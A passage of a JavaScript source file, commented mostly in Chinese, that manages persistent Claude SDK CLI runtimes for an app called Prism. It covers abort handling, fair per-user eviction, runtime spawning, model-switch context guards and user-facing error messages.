    // interrupt 协商失败或超时(子进程僵死):升级为硬撕。
    log.error(`[Claude SDK] Abort by runId ${runId} failed, escalating:`, error?.message || error);
    if (runtime && !runtime.disposed) {
      try {
        runtime.abortController?.abort();
      } catch { /* best effort */ }
      await disposePersistentRuntime(runtime).catch(() => {});
    } else if (entry.oneShotAbortController) {
      try { entry.oneShotAbortController.abort(); } catch { /* best effort */ }
    }
    return true;
  }
  // No live turn yet: the aborted flag is recorded and the dispatcher will
  // finish the run as aborted before (or instead of) starting the turn.
  /*
   * 这一条还没开跑(在等上一轮收尾、等 CLI 自己那一轮跑完,或还在准备)。CLI 自己那一轮开着的话,界面上转着的
   * 就是它:它的帧接在这一条的回合里显示。停止要把它一并停下,与没有这一条时按停止一样。不等中断落定,
   * 中止处理器当场收尾,这一条的等待随即看到停止标记退出。
   */
  const waitingOn = runtime && !runtime.disposed ? runtime : findRuntimeByAppSessionId(runId);
  if (waitingOn && !waitingOn.turn && waitingOn.orphanTurnOpen) {
    void interruptCliOwnTurn(waitingOn, runId);
  }
  return true;
}

/**
 * 停掉 CLI 自己发起的那一轮(后台任务回报、会话内定时)。
 *
 * 与停用户回合同一条 interruptRuntime:不杀进程,别的后台任务照跑;被打断的前台命令转成后台任务的,在停止窗口里
 * 一并停掉。中断协商失败才升级为强制中止(进程卡死时停止不能失灵)。
 */
async function interruptCliOwnTurn(runtime, runId) {
  try {
    log.info(`[Claude SDK] Aborting CLI-initiated turn of ${runId} via runtime interrupt`);
    await interruptRuntime(runtime, runtime.query, `run ${runId} (observed)`);
    runtime.orphanTurnOpen = false;
    settleSubagentTools(runtime, null);
    return true;
  } catch (error) {
    log.warn(`[Claude SDK] Interrupting CLI-initiated turn of ${runId} failed:`, error?.message || error);
    try { runtime.abortController?.abort(); } catch { /* best effort */ }
    return false;
  }
}

/** 预占标记(claimedAt)的时效,见 orderRuntimesForEviction 里 filter 的说明。 */
const CLAIM_STALE_MS = 30_000;

/**
 * 预占标记的值:当前时间,但严格递增。撤标记时按值认「是不是我盖的那一个」(见 releaseClaim),
 * 同一毫秒里盖的两次不能相等。
 */
let lastClaimStamp = 0;
function nextClaimStamp() {
  const now = Date.now();
  lastClaimStamp = now > lastClaimStamp ? now : lastClaimStamp + 1;
  return lastClaimStamp;
}

/** 撤掉某次发送盖的预占标记;只撤自己盖的那一个,之后别的发送盖的不动。 */
function releaseClaim(runtime, stamp) {
  if (runtime && stamp && runtime.claimedAt === stamp) runtime.claimedAt = null;
}

/**
 * 名额满时该淘汰谁:按人公平,而不是一律全局 LRU。
 *
 * 全局 LRU 不公平:一个人开二十个会话就能把池子占满,之后每个新会话都去挤
 * 别人那条最久没用的 —— 别人每轮都在重建 runtime(每轮多一次冷启动),
 * 占了十九个的那位却没有任何代价。
 *
 * 所以先看谁总共占得最多(在跑的也算,它们同样占着名额),从这个人的空闲
 * runtime 里挑最久没用的下手;打平了再比谁的那条更久没用。代价落在造成拥挤
 * 的人身上,而不是最安静的人身上。
 *
 * 纯函数,不改任何状态;排序由单测钉住。
 *
 * @param {Array<{key: string, turn: unknown, lastUsed: number, ownerUserId: number|null}>} runtimes
 * @param {string} exceptKey 本次要用的 key,不能被自己挤掉
 * @returns {Array} 空闲 runtime,按"最该被淘汰"排在最前
 */
export function orderRuntimesForEviction(runtimes, exceptKey) {
  const heldByOwner = new Map();
  for (const runtime of runtimes) {
    const owner = runtime.ownerUserId ?? null;
    heldByOwner.set(owner, (heldByOwner.get(owner) ?? 0) + 1);
  }
  return runtimes
    /**
     * 正被某次发送预占(`claimedAt`)的也算忙。
     *
     * 从 runtimeForSend 领走它(只拿那段对话自己的锁,切模型这类 await 期间别的对话照样在起进程)
     * 到 `runtime.turn = turn` 之间都是真实的 await 窗口(还有带图片回合的内容构造)。
     * 池满时另一个人的发送恰好落在这个窗口里,就会把它 dispose 掉:本次 `runtime.input.push` 抛
     * "runtime input is closed",错误不带 prism 标记,一路掉到一次性回退,overflow 预算用尽时直接报
     * "并发会话已满"。用户的回合会因为别人的一次发送而降级或失败。
     */
    .filter((runtime) => runtime.key !== exceptKey
      // "闲"的定义全链路只有 runtimeIsIdle 一份:回合刚被中止但 Bash 还在跑、或 CLI 正跑自己那一轮
      // (orphanTurnOpen)的 runtime 都不算闲,不能被淘汰。
      && runtimeIsIdle(runtime)
      // 预占有时效:领走后若因异常没能开跑也没能清标记,超过这个窗口就
      // 重新可淘汰,免得一个失败的发送把名额永久钉死。
      && !(runtime.claimedAt && Date.now() - runtime.claimedAt < CLAIM_STALE_MS))
    .sort((left, right) => {
      const leftHeld = heldByOwner.get(left.ownerUserId ?? null) ?? 0;
      const rightHeld = heldByOwner.get(right.ownerUserId ?? null) ?? 0;
      if (leftHeld !== rightHeld) return rightHeld - leftHeld; // 占得多的先掉
      return left.lastUsed - right.lastUsed;                   // 同样多则最久没用的先掉
    });
}

/**
 * 常驻进程被挤掉时通知谁。由组合根注入 —— claude-sdk 不认识 websocket 层。
 *
 * 被挤掉本身是静默的:那段对话的下一条消息要重建进程并 resume,会慢几秒。
 * 推一句说明,用户就不会把这种正常行为当成"今天特别卡"。
 */
let runtimeEvictionNotifier = null;

export function setRuntimeEvictionNotifier(notifier) {
  runtimeEvictionNotifier = typeof notifier === 'function' ? notifier : null;
}

function notifyRuntimeEvicted(runtime) {
  if (!runtimeEvictionNotifier) return;
  // 只认 app 会话 id:下游 `canViewerSeeSession` 拿它当 app 会话 id 去 `getSessionById` 查,
  // 传 provider 原生 id 必然查不到。没有 app 会话 id 的(预热建出来、还没被领用的那批)就不发,
  // 好过发一条注定送不出去的。
  const sessionId = runtime?.appSessionId || null;
  if (!sessionId) return;
  try {
    runtimeEvictionNotifier({ sessionId, reason: 'runtime_limit' });
  } catch {
    // 通知失败不该影响回收本身
  }
}

async function enforceRuntimeLimit(exceptKey) {
  // 已过名额检查、还在起进程的那几个同样占着名额(见 reservedRuntimeSlots)
  const occupied = () => claudeRuntimes.size + reservedRuntimeSlots;
  const idle = orderRuntimesForEviction([...claudeRuntimes.values()], exceptKey);
  while (occupied() >= MAX_RUNTIMES && idle.length) {
    const victim = idle.shift();
    // 排好序之后的 await 里,它可能已被自己那段对话的发送领走或开跑了(那边只拿自己的锁):动手前再判一次
    if (orderRuntimesForEviction([victim], exceptKey).length === 0) continue;
    await disposePersistentRuntime(victim);
    notifyRuntimeEvicted(victim);
  }
  if (occupied() >= MAX_RUNTIMES && !claudeRuntimes.has(exceptKey)) {
    const error = describeForUser(
      new Error(`Claude runtime limit reached (${MAX_RUNTIMES}); close an active conversation and retry`),
      'RUNTIME_LIMIT',
      `常驻会话的名额(${MAX_RUNTIMES} 个)都在忙,这一条没有开跑 —— 稍后再试。`,
    );
    // The dispatcher routes this into the BUDGETED one-shot fallback instead
    // of spawning an uncounted extra SDK process.
    error.prismRuntimeLimit = true;
    throw error;
  }
}

/**
 * 起一个常驻 runtime。名额检查、淘汰与占位在全局锁里一次做完,并发起进程时池子也不会超上限;
 * 起进程那几步(查 git、读 MCP 配置、拉起 CLI)在锁外,不挡别的对话。
 */
async function createPersistentRuntime(key, options, settings) {
  await withRuntimeMutation(async () => {
    await enforceRuntimeLimit(key);
    reservedRuntimeSlots += 1;
  });
  try {
    return await spawnPersistentRuntime(key, options, settings);
  } finally {
    reservedRuntimeSlots -= 1;
  }
}

async function spawnPersistentRuntime(key, options, settings) {
  const input = createInputQueue();
  /**
   * 非 git 目录开 CLI 的文件检查点(`enableFileCheckpointing`),让非 git 工作区也能"撤销这一轮"。
   * git 仓库里 Prism 自己有检查点(git-checkpoint.js,每轮存档),不重复开。
   * Write / Edit 改过的文件(之后被 Bash 改了也算)、新建的文件都能按轮回退,跨进程 resume 之后照样能退。
   */
  let fileCheckpointing = false;
  if (options.cwd && process.env.PRISM_FILE_CHECKPOINTS !== '0') {
    try {
      fileCheckpointing = !(await isGitRepository(options.cwd));
    } catch {
      fileCheckpointing = false;
    }
  }
  const runtime = {
    key,
    signature: persistentRuntimeSignature(options, settings),
    settings,
    input,
    sessionId: options.resumeSessionId || null,
    initialSessionId: options.resumeSessionId || null,
    turn: null,
    // 见读循环:CLI 那边还没回结果的 tool_use id。忙不忙以它为准,
    // 因为 runtime.turn 只是 Prism 自己的记账,CLI 的实际状态不归它管。
    pendingToolUses: new Set(),
    /** 子代理内部在途的工具 innerId → parentToolUseId,只给看门狗用,不参与复用判据。 */
    subagentToolUses: new Map(),
    /**
     * CLI 自己发起的一轮此刻是否"开着"(收到过无主的有内容帧、还没等到它的 result)。
     * runPersistentTurn 据此知道"我 push 进去时 CLI 正跑着自己的一轮",
     * 于是它自己那轮的 result 不能被当成用户回合的结束(见读循环里 expectForeignResult)。
     */
    orphanTurnOpen: false,
    // 被强撕/看门狗收尾、且当时还有工具在途 —— 我们对这个 CLI 的认知已经不可信,
    // 不再复用(runtimeForSend 会换新)。留着这个标记只为把原因打进日志。
    suspect: false,
    // 起出来就算被这次发送领走:登记进池子之后、调用方盖上标记之前,别的对话起进程时的名额淘汰不能挑中它
    claimedAt: nextClaimStamp(),
    lastUsed: Date.now(),
    disposed: false,
    currentModel: toSdkModel(options.model),
    /** 起这个进程时给的 effort(null = 跟模型默认);之后由 applyFlagSettings 就地改。 */
    currentEffort: options.resolvedEffort || null,
    /** 这个进程开了 CLI 文件检查点(非 git 目录)。 */
    fileCheckpointing,
    /** 起这个进程时按模型目录给的窗口(null = 没给,CLI 默认)。换窗口 = 重建,见签名。 */
    contextWindow: options.contextWindow ?? null,
    /** 起这个进程时的网关指纹(null = settings.json 那一套)与网关 id。换了 = 重建,见签名。 */
    gatewayFingerprint: options.gateway?.fingerprint ?? null,
    /** 不含模型的那份(网关 + key)与对应的宽松签名:后台任务在跑时据此决定拒 / 就地换模型。 */
    gatewayCredential: options.gateway?.credentialFingerprint ?? null,
    looseSignature: persistentRuntimeSignature(options, settings, { loose: true }),
    /** 起进程时钉进别名映射的模型(别的网关上 = 这一轮的模型);就地换模型前要确认发送者能用它。 */
    pinnedModel: toSdkModel(options.model),
    gatewayId: options.gateway?.gatewayId ?? 0,
    // settings.json 在本 runtime 启动时的指纹;runtimeForSend 据此判断配置是否已变。
    userSettingsMtimeMs: await currentUserSettingsMtimeMs(),
    currentPermissionMode: settings.permissionMode,
    lastContextUsage: null,
    contextBackfillStarted: false,
    query: null,
    abortController: null,
    stderrTail: createStderrTail(),
    // 网关侧的 app 会话 id。provider 原生 id 要等流里第一条消息才知道,而补发
    // 待批审批需要一个从第一轮开始就存在的键。
    appSessionId: typeof options.runId === 'string' ? options.runId : null,
    // 这个常驻进程算在谁头上 —— 名额满了按人公平淘汰(见 orderRuntimesForEviction)。
    ownerUserId: typeof options.ownerUserId === 'number' ? options.ownerUserId : null,
    // 记账要用。两个都对一段对话稳定,所以跟着 runtime 走而不是每轮传。
    projectPath: typeof options.cwd === 'string' && options.cwd ? options.cwd : null,
    actorUsername: typeof options.actorUsername === 'string' ? options.actorUsername : null,
  };

  const sdkOptions = buildPersistentSdkOptions(options, runtime);
  try {
    const mcpServers = await loadMcpConfig(options.cwd);
    if (mcpServers) sdkOptions.mcpServers = mcpServers;

    // runtime 活多久由空闲回收器管,这里不另设超时。
    runtime.query = query({ prompt: input, options: sdkOptions });
  } catch (error) {
    // 进程没起来:带 key 的 flag 设置文件不留
    removeFlagSettingsFile(runtime.flagSettingsFile);
    runtime.flagSettingsFile = null;
    throw error;
  }

  claudeRuntimes.set(key, runtime);
  runtime.reader = readPersistentRuntime(runtime);
  return runtime;
}

/**
 * `setModel` 失败分两类:
 * - `rejected`:网关明确不认这个模型(400 / 404 / invalid_request / 不存在 / 没权限……)→ 原样报给用户;
 * - `retry`:超时、429 / 5xx / overloaded、网络或进程通道断了 → 重建 runtime(新进程带新模型起)。
 * CLI 切模型前向网关发的那一句确认不重试(一次 529 就拒),把暂时性错误当成"模型被拒"会让用户这一条直接失败。
 * 认不出来的按 `rejected` 处理(宁可报错,不要拿同一个坏名字反复重建)。
 */
export function classifySetModelError(error) {
  if (error?.prismControlTimeout) return 'retry';
  const message = String(error?.message || error || '');
  if (/\b(408|409|429|5\d\d)\b|overload|rate.?limit|timed? ?out|timeout|ECONN|EPIPE|ETIMEDOUT|socket|transport|stream closed|process exited|network|fetch failed/i.test(message)) {
    return 'retry';
  }
  return 'rejected';
}

/**
 * 切到窗口更小的模型时,当前上下文是不是已经过了新模型的压缩线。
 *
 * 过了就拒绝这次切换:新模型第一轮就得压缩,而压缩请求 = 整段上下文 + 摘要指令,很可能超过它的
 * 真实上限 → 网关 400,手打 /compact 也是同一个 400,形成压缩死锁。
 * 让用户先用当前模型 /compact,或新开会话,再切。
 *
 * 只在"换了模型、新模型在目录里填了窗口、手里有这段对话的实测用量"时判;其余一律放行。
 * @returns {Error|null} 带 `prismModelRejected`(调度器直接报错、不退回一次性路径)与 `code`
 */
export function contextTooLargeForSwitch(runtime, options) {
  const targetModel = toSdkModel(options?.model);
  if (targetModel === (runtime?.currentModel ?? null)) return null;
  const targetWindow = Number(options?.contextWindow);
  if (!Number.isFinite(targetWindow) || targetWindow <= 0) return null;
  const used = Number(runtime?.lastContextUsage?.totalTokens);
  if (!Number.isFinite(used) || used <= 0) return null;
  // 目标窗口不比现在小 → 换过去不会比留在原地更早压缩,放行(比如 sonnet → 它映射到的同一个 128K 模型)
  const currentWindow = Number(runtime?.lastContextUsage?.maxTokens) || Number(runtime?.contextWindow) || 0;
  if (currentWindow > 0 && targetWindow >= currentWindow) return null;
  const line = targetWindow - AUTO_COMPACT_MARGIN;
  if (used < line) return null;
  const error = new Error(
    `当前上下文约 ${used} tokens,已经超过「${options.model}」的压缩线 ${line}`
    + `(窗口 ${targetWindow} − ${AUTO_COMPACT_MARGIN})。发送 /compact —— 会先用当前模型压缩,压完下一条消息自动换过去;`
    + `或新开一个会话。`,
  );
  error.prismModelRejected = true;
  error.code = 'MODEL_CONTEXT_TOO_LARGE';
  return error;
}

/** 就地改档位失败、runtime 又留着时的档位记号:跟任何真实档位(含 null)都不相等。 */
const EFFORT_UNKNOWN = Symbol('effort-unknown');

/**
 * 后台任务在跑、而这一条需要重启 CLI 时的拒绝(说清楚是哪项改动、怎么办)。
 * @param {string} reason 以名词短语结尾,比如「切回「默认」模型」「这次改了工具权限」
 * @param {string} [advice] 怎么办;默认的那句适用于「用户刚改了设置」的情形
 */
export function runtimeRebuildBlocked(reason, advice = '等它们跑完、在后台任务条上停掉,或把刚才的改动改回去,再发这条。') {
  const error = new Error(
    `这段对话还有后台任务在跑,${reason}要重启这段对话的 CLI,会把它们一起停掉 —— ${advice}`,
  );
  error.prismModelRejected = true;
  error.code = 'RUNTIME_REBUILD_BLOCKED';
  return error;
}

/**
 * 内部错误配上错误码与给用户看的中文说明。英文原文留在 message 里,只进服务端日志;
 * 发进聊天的是 prismUserMessage(见 userFacingErrorText)。
 */
function describeForUser(error, code, userMessage) {
  error.code = code;
  error.prismUserMessage = userMessage;
  return error;
}

/** 发进聊天的那句:有中文说明用中文说明,没有(CLI / 网关原样报出来的错)才用原文。 */
function userFacingErrorText(error) {
  return error?.prismUserMessage || error?.message || String(error);
}

/**
 * 这一条没有开跑就被拒(上一轮还没结束、CLI 那边还有工具在跑)。
 *
 * 带 `prismTurnNotStarted` 的错误由分发器原样报给用户,不退回一次性路径:一次性回退要 resume 同一段对话,
 * 而这个 runtime 正忙,回退只会撞上 prismRuntimeBusy。
 */
function turnNotStartedError(code, logMessage, userMessage) {
  const error = describeForUser(new Error(logMessage), code, userMessage);
  error.prismTurnNotStarted = true;
  return error;
}

/** CLI 自己发起的那一轮(后台任务回报等)正在跑工具时,用户这一条的拒绝。 */
function cliTurnBusyError() {
  return turnNotStartedError(
    'CLI_TURN_BUSY',
    'The CLI is running a tool in its own turn (background task report)',
    'CLI 正在处理后台任务的回报,这一轮还有工具在跑,这一条没有发出 —— 等它跑完再发。',
  );
}

/**
 * 告诉调用方「这一条没开跑就被拒了」:chat 层据此把已落库的用户行标成撤回(外部 API 与定时任务不接)。
 * 要在发 error / complete 之前调:那时这一轮还登记着,调用方推的帧还能编进这一轮。钩子出错只记日志。
 */
function notifyTurnNotStarted(options, error) {
  if (typeof options?.onTurnNotStarted !== 'function') return;
  try {
    options.onTurnNotStarted({ code: error?.code ?? null, message: userFacingErrorText(error) });
  } catch (hookError) {
    log.warn('[Claude SDK] onTurnNotStarted hook failed:', hookError?.message || hookError);
  }
}

/**
 * 告诉调用方「这一条已经交给 CLI 了」:常驻路径在推进输入成功的那一刻调,一次性路径在起 query 的那一刻调。
 * chat 层据此区分停止时这一条开没开跑:开跑之前停止的那一行标成撤回,开跑之后的不动。钩子出错只记日志。
 */
function notifyTurnStarted(hook) {
  if (typeof hook !== 'function') return;
  try {
    hook();
  } catch (hookError) {
    log.warn('[Claude SDK] onTurnStarted hook failed:', hookError?.message || hookError);
  }
}

/** 这段对话已经有一个用户回合在跑(或刚被停止、还在收尾)。 */
function turnBusyError() {
  return turnNotStartedError(
    'TURN_BUSY',
    'A turn is already running for this session',
    '这段对话上一轮还没结束(刚按了停止的话,它还在收尾),这一条没有发出 —— 稍等几秒再发。',
  );
}

/** 两份 runtime 签名差在哪 → 给人看的一句(拒绝消息用)。 */
export function describeSignatureChange(before, after) {
  let a = {};
  let b = {};
  try {
    a = JSON.parse(before || '{}');
    b = JSON.parse(after || '{}');
  } catch {
    return '这次的改动';
  }
  const labels = {
    cwd: '工作目录',
    bypass: '「跳过权限」档位',
    allowedTools: '工具权限(含进出 plan 模式)',
    disallowedTools: '工具权限(含进出 plan 模式)',
    contextWindow: '模型窗口(换了窗口不同的模型,或管理员改了窗口)',
    subagent: '子代理模型(管理员改了设置)',
    gateway: '网关 / key / 模型',
  };
  const changed = [...new Set(Object.keys(labels)
    .filter((field) => JSON.stringify(a[field] ?? null) !== JSON.stringify(b[field] ?? null))
    .map((field) => labels[field]))];
  return changed.length > 0 ? `这次改了${changed.join('、')},` : '这次的改动';
}

/**
 * 发送前在会话锁里等一件事落定(上一轮收尾、CLI 自己那一轮跑完),每 sendWait.pollMs 看一次。
 *
 * `isAborted()` 为真就不再等:这次发送已被停止,调用方开跑前会看到停止标记、按停止收尾。停止优先于 `done()`:
 * 停止会顺带打断 CLI 自己那一轮(见 abortClaudeSDKRun),那一轮随之"关上",要是先看 `done()`,这一条会当成
 * 等到了、接着往下走(工具结果还没回来时还会被当成残留,重建进程)。
 * 每看一次调一下 `onPoll`(续预占标记,等得再久也不会被名额淘汰挑中)。`wake` 落定时提前醒,
 * 不必干等到下一次。返回 'done' | 'aborted' | 'timeout'。
 */
async function waitForSendWindow({ done, isAborted = null, onPoll = null, timeoutMs, wake = null }) {
  const deadline = Date.now() + timeoutMs;
  let woke = false;
  let wakeCurrent = null;
  if (wake && typeof wake.then === 'function') {
    const onWake = () => {
      woke = true;
      wakeCurrent?.();
    };
    wake.then(onWake, onWake);
  }
  for (;;) {
    if (isAborted?.()) return 'aborted';
    if (done()) return 'done';
    const remaining = deadline - Date.now();
    if (remaining <= 0) return 'timeout';
    await new Promise((resolve) => {
      const timer = setTimeout(resolve, Math.min(sendWait.pollMs, remaining));
      timer.unref?.();
      wakeCurrent = woke ? null : () => {
        clearTimeout(timer);
        resolve();
      };
    });
    wakeCurrent = null;
    onPoll?.();
  }
}

/**
 * Get or build the runtime for one send. Signature changes (cwd, bypass, tool
 * lists, context window, subagent model, gateway) rebuild the runtime but RESUME
 * the same native conversation; model, effort and permission mode are switched
 * in place.
 *
 * `isAborted`:这次发送有没有被停止(调用方的 runEntry.aborted)。两段等待据此提前结束,
 * 原样交回 runtime,调用方按停止收尾,不开跑。
 */
async function runtimeForSend(options, { isAborted = null } = {}) {
  const settings = runtimeSettingsFromOptions(options);
  const requestedSessionId = options.sessionId || null;
  const key = requestedSessionId || `pending:${createRequestId()}`;
  // 只有 /compact 被压缩线挡住时会改写(见下方 contextTooLargeForSwitch 那段)
  let signature = persistentRuntimeSignature(options, settings);

  /**
   * 领走的那一刻就盖上 `claimedAt`。
   *
   * 这个标记让淘汰排序与空闲回收把它当"忙"(见 orderRuntimesForEviction / runtimeReapable),覆盖
   * "已领走但还没 `runtime.turn = turn`"那段 await 窗口。真正开跑时由
   * runPersistentTurn 清掉;没能开跑的,标记过了 CLAIM_STALE_MS 自然失效。
   */
  const claim = (runtime) => {
    if (runtime) runtime.claimedAt = nextClaimStamp();
    return runtime;
  };
  /** 锁里拿着的 runtime 与它的标记;这一条被拒时撤掉(见末尾的 rejection 处理)。 */
  let held = null;

  // 只拿这段对话自己的锁:切模型、收尾等待这些慢操作不挡别的对话(见 withSessionLock)
  return withSessionLock(key, async () => {
    let runtime = requestedSessionId ? claudeRuntimes.get(requestedSessionId) : null;
    /**
     * 拿着的 runtime 一直盖着预占标记:这把锁只挡同一段对话,下面这些 await 期间别的对话照样在起进程、
     * 做名额淘汰。控制请求每个最长 RUNTIME_CONTROL_TIMEOUT_MS,做完一个续一次,别让标记中途过期。
     */
    const hold = () => {
      if (!runtime || runtime.disposed) return;
      claim(runtime);
      held = { runtime, stamp: runtime.claimedAt };
    };
    /**
     * 后台任务在跑时不悄悄重建:重建 = 新进程 resume,老进程连同它的后台任务一起停掉
     * (共享会话里停的可能是别人的活)。切回 default 档、settings.json 变了、切档 / 换模型 / 改档位失败后的自救
     * 都走这里:后台任务在跑就拒这一条、说清楚原因;没有就 dispose + resume。
     * 卡死自救(还有工具在途的那条)不走这里:那个进程本来就不可信了。
     */
    const rebuildOrRefuse = async (reason) => {
      if ((runtime.liveBackgroundTasks?.size ?? 0) > 0) throw runtimeRebuildBlocked(reason);
      const resumeSessionId = runtime.sessionId || requestedSessionId;
      await disposePersistentRuntime(runtime);
      return createPersistentRuntime(key, { ...options, resumeSessionId }, settings);
    };

    if (runtime && runtime.disposed) {
      claudeRuntimes.delete(runtime.key);
      runtime = null;
    }
    hold();

    /** 等的那段时间里进程没了(崩溃、被关掉):当作没有 runtime,下面按新建走(resume 同一段对话)。 */
    const forgetIfDisposed = () => {
      if (!runtime?.disposed) return;
      if (claudeRuntimes.get(runtime.key) === runtime) claudeRuntimes.delete(runtime.key);
      runtime = null;
    };

    if (runtime && runtime.turn) {
      /**
       * 上一轮还在收尾时先等,别立刻拒。
       *
       * `query.interrupt()` 返回只代表子进程收到了中断请求,回合要等流上那条 `result` 帧到达、由
       * `finishPersistentTurn` 把 `runtime.turn` 置 null 才算结束;而网关在 interrupt 返回时就把 run
       * 标成 completed、解锁了输入框。「按停止 → 改一句话 → 重发」会撞进这段窗口,立刻拒的话消息要重打。
       *
       * 最多等 TURN_SETTLE_GRACE_MS,上一轮一收尾就接着走:正常的「停止后重发」自然排在后面,只有上一轮
       * 迟迟不收尾(或真正的并发双发)才拒。这次发送被停止了就不再等,原样交回,调用方按停止收尾。
       */
      const settled = await waitForSendWindow({
        done: () => !runtime.turn,
        isAborted,
        onPoll: hold,
        timeoutMs: sendWait.turnSettleMs,
        wake: runtime.turn.promise,
      });
      if (settled === 'aborted') return runtime;
      if (runtime.turn) {
        throw turnBusyError();
      }
      forgetIfDisposed();
      hold();
    }

    /**
     * 切到窗口更小的模型、而上下文已过它的压缩线:拒绝(见 contextTooLargeForSwitch)。
     * 放在所有"重建"分支之前:任何一条重建都会按新模型起进程,绕过它就是压缩死锁。
     *
     * `/compact` 例外:切换被挡住时,`/compact` 这一轮用 runtime 当前的模型与窗口跑(不切模型)。
     * 否则提示里让用户发的 /compact 本身也会被同一条规则拒掉(`active-model` 已经改成了新模型,
     * 每一轮都按新模型来),用户只能先手动切回去。压完下一轮再切,那时上下文已经在新模型的线下。
     */
    // 没有活的 runtime(空闲回收 / 被淘汰之后)就拿 dispose 时记下的那份用量判 —— 否则回收后发的 /compact
    // 会按新(小)窗口的模型起进程,正好撞上这条规则要防的死锁。Prism 重启后这份记忆没了,那时放行。
    const guardSubject = runtime ?? (requestedSessionId ? lastRuntimeContextBySession.get(requestedSessionId) ?? null : null);
    if (guardSubject) {
      const tooLarge = contextTooLargeForSwitch(guardSubject, options);
      if (tooLarge) {
        if (!options.compactCommand) throw tooLarge;
        log.info(`[Claude SDK] /compact 用当前模型 ${guardSubject.currentModel ?? 'default'} 跑(切到 ${options.model} 被压缩线挡住,压完再切)`);
        const compactModel = guardSubject.currentModel ?? 'default';
        // 网关与 key 也要按"当前模型"重新解析:目标模型可能在另一个网关上
        const compactViewer = turnViewer(options, null);
        // 当前模型可能是别人的(共享会话里 A 的限人模型,别名也算):这个人不能借 /compact 用它
        if (!(await claudeModelCatalog.isUsable(compactModel, compactViewer))) {
          throw new ModelNotAllowedError(
            String(compactModel),
            `这段对话现在用的模型「${compactModel}」你不能用(不在它的可用人员里),没法用它先压缩 —— 新开一个会话,或请能用它的人压缩。`,
          );
        }
        const compactGateway = await resolveTurnGateway({ model: compactModel, viewer: compactViewer });
        options = {
          ...options,
          model: compactModel,
          contextWindow: guardSubject.contextWindow ?? null,
          gateway: compactGateway,
          subagentEnv: subagentModelEnv(undefined, { viewer: compactViewer, gatewayId: compactGateway.gatewayId }),
        };
        signature = persistentRuntimeSignature(options, settings);
      }
    }

    /**
     * CLI 自己发起的那一轮(后台任务回报、会话内定时)正在跑主线程工具:等它跑完再发,不拒、不重建。
     *
     * 那是正常的活,不是残留:重建会连同进程里其余的后台子代理 / 后台命令一起杀掉,正在执行的工具也会被腰斩;
     * 往里推 `'now'` 又会在这条工具跑完后把那一轮收掉。所以在这段对话自己的锁里等那一轮收尾(orphanTurnOpen
     * 变 false),再照常开跑。等的时候用户这一轮已经登记,CLI 那一轮的帧经观测回合那条路交给它的 writer
     * (observed-run 的 observeOrphanFrames),界面上看得到 CLI 在做什么。放在压缩线检查之后:那道检查要拒的
     * 发送当场拒,不必先等。
     *
     * 提前结束的三种情况:这次发送被停止(原样交回,调用方按停止收尾);进程没了(按新建走);那一轮卡死了
     * (ORPHAN_TURN_STALL_MS 里一帧都没有,按下面的残留处理)。等满 ORPHAN_TURN_WAIT_MS 那一轮还在跑,
     * 由下面的在途工具分支拒这一条。
     */
    if (runtime && runtime.orphanTurnOpen && runtime.pendingToolUses.size > 0 && !orphanTurnStalled(runtime)) {
      const waited = await waitForSendWindow({
        done: () => runtime.disposed || !runtime.orphanTurnOpen || orphanTurnStalled(runtime),
        isAborted,
        onPoll: hold,
        timeoutMs: sendWait.orphanTurnMs,
      });
      if (waited === 'aborted') return runtime;
      forgetIfDisposed();
      hold();
    }

    /**
     * 这次发送已经被停止了:有 runtime 就原样交回,下面的残留重建、换配置重建一律不做,调用方开跑前看到停止标记、
     * 按停止收尾。
     *
     * 停止会顺带打断 CLI 自己那一轮(见 abortClaudeSDKRun),打断回执一到那一轮就算关上了,工具结果却要稍后才回来。
     * 停止若落在走到这里之前(分发器的检查点、解析模型那几段 await),上面那段等待不会进,不在这里拦的话,
     * 这一条会被下面当成残留,把进程 dispose 后重建:被停止的这一条白起一个进程,被打断那一轮的收尾帧也随老进程没了。
     * 没有 runtime 时照旧往下走(停止落在冷启动之前也是这样),调用方开跑前同样按停止收尾。不能在这里交回 null:
     * 两个调用方拿到之后马上读 runtime 上的预占标记,/loop 会把这个空值报成「Agent Loop 失败」。
     */
    if (runtime && isAborted?.()) return runtime;

    // 没有回合 ≠ CLI 闲着。上一回合若是被中止/看门狗收掉的,它起的工具可能还在跑,
    // 这个 runtime 就不能再用了 —— 复用它等于把新消息排到那个工具后面。
    // 换一个干净的 CLI(resume 同一段对话),代价是一次 resume,换来的是
    // "发出去的消息一定会被处理"。
    if (runtime && runtime.pendingToolUses.size > 0) {
      /**
       * CLI 自己发起的那一轮上面已经等过了:走到这里还开着、也没卡死,就是等满了上限还在跑。拒这一条、说清楚,
       * 不重建(理由见上面那段等待)。那一轮卡死了(ORPHAN_TURN_STALL_MS 里一帧都没有)就按下面的残留处理。
       */
      if (runtime.orphanTurnOpen && !orphanTurnStalled(runtime)) {
        throw cliTurnBusyError();
      }
      // 残留的在途工具同样不能拿后台任务陪葬:后台任务在跑就拒,与 rebuildOrRefuse 同一条规矩
      if ((runtime.liveBackgroundTasks?.size ?? 0) > 0) {
        throw runtimeRebuildBlocked('上一轮停下时还有工具调用没收尾,', '等它们跑完,或在后台任务条上停掉,再发这条。');
      }
      log.warn(
        `[Claude SDK] Runtime ${runtime.key} still has ${runtime.pendingToolUses.size} tool call(s) in flight `
        + `after its turn ended${runtime.suspect ? ' (marked suspect)' : ''}; rebuilding instead of reusing it`
      );
      const resumeSessionId = runtime.sessionId || requestedSessionId;
      await disposePersistentRuntime(runtime);
      return createPersistentRuntime(key, { ...options, resumeSessionId }, settings);
    }

    // ~/.claude/settings.json 变了(模型映射的 env 就住在里面)—— 这个常驻子进程
    // 携带的还是启动时那份配置,只有重建才会重读。改完 settings 的下一条消息在
    // 这里自动换新,不再需要重启 Prism 或手动切档。正在跑的轮次已在上面挡掉。
    if (runtime && runtime.userSettingsMtimeMs !== undefined) {
      const settingsMtimeMs = await currentUserSettingsMtimeMs();
      if (settingsMtimeMs !== runtime.userSettingsMtimeMs) {
        /*
         * 后台任务在跑时先不重建、也不拒:这不是发消息的人做的改动,他改不回去,拒的话这段对话在
         * 后台任务跑完前一句话都发不出去。照旧用老进程(带着老配置),mtime 不更新,等后台任务跑完、
         * 下一条消息再重建。换网关 / key 的情况仍由下面的签名比对把关。
         */
        // 后台任务刚跑完、CLI 正在跑它自己那一轮(汇报结果,orphanTurnOpen)时也先不重建:「跑完后的第一条」
        // 正好撞在这一刻,重建会把那一轮掐断;这条照常并进去(runPersistentTurn 认 foreign result)。
        if ((runtime.liveBackgroundTasks?.size ?? 0) > 0 || runtime.orphanTurnOpen) {
          if (runtime.settingsRebuildDeferredAt !== settingsMtimeMs) {
